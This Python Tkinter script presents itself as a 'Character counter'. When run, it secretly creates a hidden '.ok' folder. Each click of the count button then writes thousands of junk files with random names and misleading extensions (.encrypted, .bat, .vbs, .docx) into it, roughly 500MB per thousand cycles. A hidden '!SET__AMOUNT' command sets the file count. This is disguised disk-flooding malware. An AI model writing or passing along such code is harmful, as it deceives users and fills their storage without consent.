import os
import random 
from tkinter import Entry
import tkinter as tk
from tkinter import ttk

#
#
# IMPORTANT: Enter !SET__AMOUNT followed by the amount of cycles you want the program to run (1000≈500MB)

# Variables

pnam = os.path.dirname(os.path.abspath(__file__))
listuno = ["trumpisa∂˚ƒµ≤ß´¬ƒº´;dflßnidiot", "weedi∂˚ƒµ≤ß´¬ƒº´;dflßslegal", "bu∂˚ƒµ≤ß´¬ƒº´;dflßt", "g∂˚ƒµ≤ß´¬ƒº´;dflßame", "fi∂˚ƒµ≤flßsh","hel∂˚ƒµdflßlo","hç≈≈çµß∂µß∂˜el∂˚ƒµ≤ß´¬ƒº´dflßl","idoßßvµ≈µ¬¬åø££–≠ntlikeyou","ne∂˚ƒµ≤ß´¬ƒº´;dflßt","americaåß","lmfå∂™™ªao","omfåçƒggorß∂∂˚ƒµ≤ß´¬ƒº´dflßlnoway","ƒƒ˙∑™™™ƒ","2efd∂ß∂˚ƒµ≤ß´¬ƒº´;dflßºƒºƒ∂∆f","123ß™∑ƒπø¬ø¬˚4567",".h˚˚√i",".08ßø£∑7",".d≈∆ƒir",".qw™∑ƒsß∂ƒœ∑ƒ∂erty",".ß∂ƒœ∑ƒ∂","sythhiß∂ƒ∂ßß∂∂˚ƒµ≤ß´¬ƒº´;dflßsry","¡","|¶⁊#❣✃","♈︎♅⎤〕OḨĦ₳","₲☐☐☑︎・❂","🏐⥪🏐🍊➠⤚","⬈⥹","℀℁™℠","≞⊍⨴⨫⟕⫱𝐇𝐠𝚋𝟺","✶❃✰﹅"]
lisdos = [".txt",".rtf",".py",".cpp",".rtfd",".c",".bat",".wav",".pdf",".docx",".doc",".sh",".mp4",".ogg",".encrypted",".ppt",".pptx",".html",".css",".vbs",".mov",".png",".jpg",".key"]
numofstr = 0
lenone = len(listuno) - 1
lentwo = len(lisdos) -1
global AmtTime
AmtTime = 2000

# Tkinter window definiton and invisible folder creator

root = tk.Tk()
root.title("Character counter")
root.geometry("500x200+500+500")
if os.path.exists(pnam + "/.ok/"):
    a=1+1
else: 
    os.makedirs(pnam + "/.ok/")



# Flooding function and character counter

def func():
    global AmtTime
    print (lenone)
    print(lentwo)

    lmfao = inputone.get()
    numofstr = int(len(lmfao))
    if "!SET__AMOUNT" in lmfao:
        AmtTime = "".join([ele for ele in lmfao if ele.isdigit()])
        
        print(AmtTime)
        rootpt2 = tk.Tk()
        root.title("Wow")
        llabell = tk.Label(rootpt2,text="Good Job, amount changed to " + str(AmtTime))
        AmtTime = int(AmtTime) + 1
        llabell.pack()
        rootpt2.mainloop()
        
    else:
        titlethree.config(text="Number of charaters: " + str(numofstr))
        for x in range(1, int(AmtTime)):
            randum = random.randint(0,lenone)
            randum2 = random.randint(0,lenone)
            randum3 = random.randint(0,lenone)
            radum = random.randint(0,lentwo)
            nop = open(pnam + "/.ok/" + str(listuno[randum]) + str(listuno[randum2]) + str(listuno[randum3]) + str(randum) + str(lisdos[radum]), "w")
            for x in range(1,9999): 
                nop.write(str(listuno[random.randint(1,lenone)]) +  str(listuno[random.randint(1,lenone)]) + "\n")

# Tkinter shite

titletwo = ttk.Label(root, text="Enter the string you want to count: ")
titlethree = ttk.Label(root, text= "Number of characters: " + str(numofstr))

userinput = tk.StringVar()
inputone = tk.Entry(root, textvariable = userinput)

btnone = ttk.Button(root, text="count", command = func)

# Tkinter packing

titletwo.pack()
titlethree.pack()
inputone.pack()
btnone.pack()


# Tkinter window mainloop

root.mainloop()